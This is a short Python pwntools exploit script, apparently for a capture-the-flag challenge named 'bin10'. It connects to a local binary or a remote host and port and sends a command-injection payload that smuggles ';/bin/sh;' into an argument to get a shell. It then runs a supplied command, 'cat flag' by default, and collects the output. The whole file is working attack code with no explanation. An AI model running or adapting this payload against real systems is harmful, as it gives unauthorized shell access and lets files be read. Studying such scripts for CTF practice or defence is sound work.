from pwn import *

context(arch = 'i386' , os = 'linux', endian = 'little')
context.log_level = 'info'

def exp(debug,binary,msg,ip=0,port=0,timeout=1):
	if debug == 1:
		p = process(binary)
		# gdb.attach(p, 'b *0x08048B79\nc')
	else:
		p = remote(ip, port,timeout=timeout)
	try:

		p.recvuntil(':\n',timeout=timeout)
		p.sendline('ls \\\\";/bin/sh;\\\\" ')

		p.sendline('echo 123')

		p.recvuntil('123',timeout=timeout)

		p.sendline(msg)

		p.sendline('echo 456')

		flag = p.recvuntil('456',timeout=timeout).replace('\n','')
		p.close()

		return flag[:-3]
	except:
		p.close()
		return ''


if __name__ == '__main__':
	print exp(1,'bin10','cat flag')
